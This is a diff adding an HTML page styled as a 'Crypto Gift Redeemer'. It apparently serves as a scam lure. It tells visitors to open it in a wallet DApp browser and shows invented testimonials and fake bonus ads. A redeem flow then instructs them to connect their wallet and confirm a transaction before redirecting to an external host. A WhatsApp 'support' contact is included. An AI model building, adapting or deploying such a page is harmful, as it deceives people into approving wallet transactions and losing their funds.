@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Crypto Gift Redeemer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --primary: #00ffcc;
+            --primary-dark: #00cca3;
+            --primary-glow: rgba(0, 255, 204, 0.3);
+            --bg: #050d1f;
+            --bg-gradient: linear-gradient(135deg, #050d1f 0%, #0a1a3a 100%);
+            --card-bg: #0f1c3f;
+            --card-border: #1a2d5a;
+            --card-glow: rgba(26, 45, 90, 0.5);
+            --text: #ffffff;
+            --text-secondary: #a0b3d9;
+            --danger: #ff4757;
+            --warning: #ffa502;
+            --success: #2ed573;
+            --ad-bg: rgba(255, 215, 0, 0.1);
+            --ad-border: #ffd700;
+            --testimonial-bg: rgba(15, 28, 63, 0.7);
+            --whatsapp: #25D366;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: var(--bg-gradient);
+            color: var(--text);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+            font-weight: bold;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 4rem;
+            margin-bottom: 15px;
+            animation: float 3s ease-in-out infinite;
+            display: inline-block;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(5deg); }
+        }
+
+        h1 {
+            color: var(--primary);
+            font-size: 32px;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, var(--primary), #00ccff, var(--primary));
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shimmer 3s linear infinite;
+            font-weight: 900;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: 0% center; }
+            100% { background-position: 200% center; }
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 16px;
+            margin-bottom: 20px;
+            animation: slideIn 0.6s ease-out 0.2s both;
+            font-weight: bold;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+            animation: slideIn 0.6s ease-out 0.4s both;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px 20px;
+            background: rgba(15, 28, 63, 0.8);
+            border: 2px solid var(--card-border);
+            border-radius: 12px;
+            color: var(--text);
+            font-size: 16px;
+            transition: all 0.3s ease;
+            font-weight: bold;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 20px var(--primary-glow);
+            transform: scale(1.02);
+        }
+
+        input::placeholder {
+            color: var(--text-secondary);
+            font-weight: bold;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, var(--primary), var(--primary-dark));
+            border: none;
+            border-radius: 12px;
+            color: #050d1f;
+            font-size: 18px;
+            font-weight: 900;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 255, 204, 0.3);
+        }
+
+        .btn:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border: 2px solid var(--card-border);
+            color: var(--primary);
+            font-weight: 900;
+        }
+
+        .btn-secondary:hover {
+            background: rgba(0, 255, 204, 0.1);
+            box-shadow: 0 5px 15px rgba(0, 255, 204, 0.1);
+        }
+
+        .btn-danger {
+            background: linear-gradient(45deg, var(--danger), #ff6b81);
+            color: white;
+            font-weight: 900;
+        }
+
+        .btn-whatsapp {
+            background: linear-gradient(45deg, var(--whatsapp), #1da851);
+            color: white;
+            font-weight: 900;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 30px;
+            margin-top: 25px;
+            animation: cardAppear 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, var(--card-glow) 0%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+
+        .card:hover::before {
+            opacity: 1;
+        }
+
+        @keyframes cardAppear {
+            0% { opacity: 0; transform: scale(0.8) rotateX(-10deg); }
+            100% { opacity: 1; transform: scale(1) rotateX(0); }
+        }
+
+        .card-title {
+            color: var(--primary);
+            font-size: 20px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 900;
+        }
+
+        .card-content {
+            color: var(--text);
+            line-height: 1.6;
+            font-weight: bold;
+        }
+
+        .card-content p {
+            font-weight: bold;
+        }
+
+        .amount {
+            font-size: 36px;
+            font-weight: 900;
+            color: var(--primary);
+            margin: 20px 0;
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .crypto-badge {
+            display: inline-block;
+            background: rgba(0, 255, 204, 0.1);
+            color: var(--primary);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 900;
+            margin-left: 10px;
+            animation: badgeGlow 2s infinite alternate;
+        }
+
+        @keyframes badgeGlow {
+            from { box-shadow: 0 0 5px var(--primary-glow); }
+            to { box-shadow: 0 0 15px var(--primary-glow); }
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 900;
+            text-transform: uppercase;
+            margin-left: 10px;
+            animation: slideInRight 0.5s ease-out;
+        }
+
+        .status-redeemed {
+            background: rgba(255, 71, 87, 0.1);
+            color: var(--danger);
+        }
+
+        .status-pending {
+            background: rgba(255, 165, 2, 0.1);
+            color: var(--warning);
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+            animation: fadeInUp 0.6s ease-out 0.3s both;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .btn-group .btn {
+            flex: 1;
+        }
+
+        .info-text {
+            text-align: center;
+            color: var(--text);
+            font-size: 14px;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(15, 28, 63, 0.5);
+            border-radius: 10px;
+            border-left: 3px solid var(--primary);
+            animation: fadeIn 1s ease-out;
+            font-weight: bold;
+        }
+
+        .icon {
+            font-size: 20px;
+            animation: spinSlow 10s linear infinite;
+        }
+
+        @keyframes spinSlow {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .error-message {
+            background: rgba(255, 71, 87, 0.1);
+            border-left: 4px solid var(--danger);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            color: var(--danger);
+            animation: shake 0.5s ease;
+            font-weight: bold;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        .success-message {
+            background: rgba(46, 213, 115, 0.1);
+            border-left: 4px solid var(--success);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            color: var(--success);
+            animation: celebrate 0.6s ease;
+            font-weight: bold;
+        }
+
+        @keyframes celebrate {
+            0% { transform: scale(0.5); opacity: 0; }
+            70% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* Testimonial Styles */
+        .testimonial-container {
+            margin: 30px 0;
+            animation: slideIn 0.8s ease-out 0.6s both;
+        }
+
+        .testimonial {
+            background: var(--testimonial-bg);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 1px solid var(--card-border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .testimonial::after {
+            content: '"';
+            position: absolute;
+            top: -20px;
+            right: 20px;
+            font-size: 80px;
+            color: var(--primary);
+            opacity: 0.1;
+            font-family: serif;
+        }
+
+        .testimonial-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        .testimonial-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--primary), var(--primary-dark));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            animation: avatarFloat 3s ease-in-out infinite;
+            font-weight: bold;
+        }
+
+        @keyframes avatarFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .testimonial-author {
+            font-weight: 900;
+            color: var(--primary);
+        }
+
+        .testimonial-date {
+            color: var(--text);
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .testimonial-content {
+            color: var(--text);
+            line-height: 1.5;
+            font-style: italic;
+            font-weight: bold;
+        }
+
+        /* Ad Styles */
+        .ad-container {
+            margin: 25px 0;
+            animation: adSlide 0.8s ease-out 0.8s both;
+        }
+
+        @keyframes adSlide {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .ad-banner {
+            background: var(--ad-bg);
+            border: 2px solid var(--ad-border);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ad-banner::before {
+            content: '✨';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            animation: sparkle 2s infinite;
+        }
+
+        .ad-banner::after {
+            content: '✨';
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            animation: sparkle 2s infinite 0.5s;
+        }
+
+        @keyframes sparkle {
+            0%, 100% { opacity: 0.5; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+
+        .ad-title {
+            color: #ffd700;
+            font-size: 18px;
+            margin-bottom: 10px;
+            font-weight: 900;
+        }
+
+        .ad-content {
+            color: var(--text);
+            font-size: 14px;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .ad-cta {
+            background: linear-gradient(45deg, #ffd700, #ffed4e);
+            color: #000;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-weight: 900;
+            display: inline-block;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .ad-cta:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        /* Particles Animation */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            background: var(--primary);
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: floatParticle 20s infinite linear;
+        }
+
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) rotate(0deg); }
+            100% { transform: translateY(-100px) rotate(360deg); }
+        }
+
+        /* WhatsApp Floating Button */
+        .whatsapp-float {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            background: var(--whatsapp);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+            text-decoration: none;
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+            z-index: 1000;
+            animation: whatsappPulse 2s infinite;
+            transition: all 0.3s ease;
+        }
+
+        @keyframes whatsappPulse {
+            0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(37, 211, 102, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
+        }
+
+        .whatsapp-float:hover {
+            transform: scale(1.1);
+            background: #1da851;
+        }
+
+        /* Mobile Responsive Styles */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+                align-items: flex-start;
+            }
+
+            .container {
+                max-width: 100%;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .logo {
+                font-size: 3rem;
+            }
+
+            .subtitle {
+                font-size: 14px;
+            }
+
+            input {
+                padding: 16px;
+                font-size: 14px;
+            }
+
+            .btn {
+                padding: 16px;
+                font-size: 16px;
+            }
+
+            .card {
+                padding: 20px;
+                margin-top: 20px;
+            }
+
+            .amount {
+                font-size: 28px;
+            }
+
+            .btn-group {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .btn-group .btn {
+                width: 100%;
+            }
+
+            .testimonial {
+                padding: 15px;
+            }
+
+            .testimonial-avatar {
+                width: 40px;
+                height: 40px;
+                font-size: 16px;
+            }
+
+            .ad-banner {
+                padding: 15px;
+            }
+
+            .ad-title {
+                font-size: 16px;
+            }
+
+            .ad-content {
+                font-size: 13px;
+            }
+
+            .ad-cta {
+                padding: 8px 16px;
+                font-size: 14px;
+            }
+
+            .whatsapp-float {
+                width: 50px;
+                height: 50px;
+                font-size: 25px;
+                bottom: 15px;
+                right: 15px;
+            }
+
+            .info-text {
+                font-size: 13px;
+                padding: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 20px;
+            }
+
+            .logo {
+                font-size: 2.5rem;
+            }
+
+            .subtitle {
+                font-size: 12px;
+            }
+
+            .card-title {
+                font-size: 18px;
+            }
+
+            .card-content {
+                font-size: 14px;
+            }
+
+            .amount {
+                font-size: 24px;
+            }
+
+            .crypto-badge {
+                font-size: 12px;
+                padding: 6px 12px;
+            }
+
+            .status-badge {
+                font-size: 10px;
+                padding: 4px 8px;
+            }
+        }
+
+        /* Mobile Touch Optimizations */
+        @media (hover: none) and (pointer: coarse) {
+            .btn:hover {
+                transform: none;
+                box-shadow: none;
+            }
+
+            .btn:active {
+                transform: scale(0.98);
+            }
+
+            .ad-cta:hover {
+                transform: none;
+            }
+
+            .ad-cta:active {
+                transform: scale(0.95);
+            }
+
+            .whatsapp-float:hover {
+                transform: none;
+            }
+
+            .whatsapp-float:active {
+                transform: scale(0.95);
+            }
+
+            input:focus {
+                transform: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <!-- WhatsApp Floating Button -->
+    <a href="https://wa.me/+12568212395" target="_blank" class="whatsapp-float">
+        <span>💬</span>
+    </a>
+    
+    <div class="container">
+        <div class="header">
+            <div class="logo">🎁</div>
+            <h1>Crypto E-Code Redeemer</h1>
+            <p class="subtitle">🔹 Open this page inside your wallet DApp browser</p>
+        </div>
+
+        <!-- Ad Banner -->
+        <div class="ad-container">
+            <div class="ad-banner">
+                <div class="ad-title">🚀 Limited Time Offer!</div>
+                <div class="ad-content">Get 20% bonus on your next crypto purchase</div>
+                <a href="#" class="ad-cta">Claim Offer Now</a>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <input type="text" id="code" placeholder="Enter E-Code" autocomplete="off">
+        </div>
+
+        <button class="btn" onclick="check()">
+            <span class="icon">🔍</span> VIEW GIFT DETAILS
+        </button>
+
+        <!-- Testimonials -->
+        <div class="testimonial-container">
+            <div class="testimonial">
+                <div class="testimonial-header">
+                    <div class="testimonial-avatar">JD</div>
+                    <div>
+                        <div class="testimonial-author">John D.</div>
+                        <div class="testimonial-date">2 hours ago</div>
+                    </div>
+                </div>
+                <div class="testimonial-content">
+                    "Redeemed $500 in BTC instantly! The process was smooth and secure."
+                </div>
+            </div>
+
+            <div class="testimonial">
+                <div class="testimonial-header">
+                    <div class="testimonial-avatar">SK</div>
+                    <div>
+                        <div class="testimonial-author">Sarah K.</div>
+                        <div class="testimonial-date">Yesterday</div>
+                    </div>
+                </div>
+                <div class="testimonial-content">
+                    "Received my ETH gift without any issues. Great service!"
+                </div>
+            </div>
+        </div>
+
+        <div id="info"></div>
+
+        <!-- Another Ad -->
+        <div class="ad-container">
+            <div class="ad-banner">
+                <div class="ad-title">💎 Secure Wallet</div>
+                <div class="ad-content">Protect your crypto with our military-grade security</div>
+                <a href="#" class="ad-cta">Learn More</a>
+            </div>
+        </div>
+
+        <p class="info-text">
+            ℹ️ Enter your crypto gift code above to check balance and redeem
+        </p>
+    </div>
+
+    <script>
+        // Create floating particles
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            for (let i = 0; i < 20; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                const size = Math.random() * 5 + 2;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.animationDelay = `${Math.random() * 20}s`;
+                particle.style.animationDuration = `${Math.random() * 10 + 15}s`;
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        createParticles();
+
+        let currentCode = "";
+
+        function check() {
+            const code = document.getElementById("code").value.trim();
+            if (!code) {
+                showError("Please enter a valid E-Code");
+                return;
+            }
+            
+            fetch("/check", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ code })
+            })
+            .then(r => r.json())
+            .then(d => {
+                if (d.error) {
+                    if (d.error.toLowerCase().includes("already redeemed") || d.error.toLowerCase().includes("redeemed")) {
+                        showRedeemedCard(d);
+                    } else {
+                        showError(d.error);
+                    }
+                    return;
+                }
+                currentCode = code;
+                showGiftCard(d);
+            })
+            .catch(err => {
+                showError("Network error. Please try again.");
+            });
+        }
+
+        function showGiftCard(data) {
+            const info = document.getElementById("info");
+            info.innerHTML = `
+                <div class="card">
+                    <h2 class="card-title">
+                        🎁 Gift Card Details
+                        <span class="status-badge status-pending">Pending</span>
+                    </h2>
+                    <div class="card-content">
+                        <p>You have received a crypto gift!</p>
+                        <div class="amount">
+                            ${data.amount}
+                            <span class="crypto-badge">${data.crypto}</span>
+                        </div>
+                        <p>This gift card is ready to be redeemed. Click the redeem button below to claim your crypto.</p>
+                    </div>
+                    <div class="btn-group">
+                        <button class="btn" onclick="redeem()">
+                            <span class="icon">💰</span> REDEEM NOW
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+
+        function showRedeemedCard(data) {
+            const info = document.getElementById("info");
+            info.innerHTML = `
+                <div class="card">
+                    <h2 class="card-title">
+                        ⚠️ Gift Card Status
+                        <span class="status-badge status-redeemed">Redeemed</span>
+                    </h2>
+                    <div class="card-content">
+                        <p>This gift card has already been redeemed.</p>
+                        <div class="amount" style="color: var(--text-secondary);">
+                            ${data.amount || 'N/A'}
+                            <span class="crypto-badge">${data.crypto || 'CRYPTO'}</span>
+                        </div>
+                        <p>If you believe this is an error or need assistance with this gift card, please contact our support team.</p>
+                    </div>
+                    <div class="btn-group">
+                        <button class="btn btn-secondary" onclick="viewReceipt()">
+                            <span class="icon">📄</span> VIEW RECEIPT
+                        </button>
+                        <button class="btn btn-whatsapp" onclick="contactSupport()">
+                            <span class="icon">💬</span> WHATSAPP SUPPORT
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+
+        function showError(message) {
+            const info = document.getElementById("info");
+            info.innerHTML = `
+                <div class="error-message">
+                    <strong>⚠️ ERROR:</strong> ${message}
+                </div>
+            `;
+        }
+
+        function redeem() {
+            fetch("/redeem", {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ code: currentCode })
+            })
+            .then(r => r.json())
+            .then(d => {
+                if (d.success) {
+                    info.innerHTML = `
+                        <div class="card">
+                            <h2 class="card-title">🚀 Ready to Claim</h2>
+                            <div class="card-content">
+                                <p>Your gift is ready to be claimed! Follow these steps:</p>
+                                <div style="margin: 25px 0;">
+                                    <p>1. <b>🔗 Connect your wallet</b> to the network</p>
+                                    <p>2. <b>➕ Add transaction</b> to your wallet</p>
+                                    <p>3. <b>✅ Confirm</b> the transaction</p>
+                                </div>
+                                <p style="color: var(--primary); font-weight: bold;">
+                                    Click "Agree & Continue" to proceed to the redemption page.
+                                </p>
+                            </div>
+                            <div class="btn-group">
+                                <button class="btn" onclick="agree()">
+                                    <span class="icon">✅</span> AGREE & CONTINUE
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                } else if (d.error) {
+                    showError(d.error);
+                }
+            })
+            .catch(err => {
+                showError("Network error during redemption.");
+            });
+        }
+
+        function agree() {
+            window.location.href = "https://cryptopay-x26h.onrender.com";
+        }
+
+        function viewReceipt() {
+            window.location.href = "receipt.html";
+        }
+
+        function contactSupport() {
+            const message = `Hello, I need support regarding my crypto gift card. Code: ${currentCode || 'Not specified'}`;
+            const encodedMessage = encodeURIComponent(message);
+            const whatsappURL = `https://wa.me/+12568212395?text=${encodedMessage}`;
+            window.open(whatsappURL, '_blank');
+        }
+    </script>
+</body>
+</html>
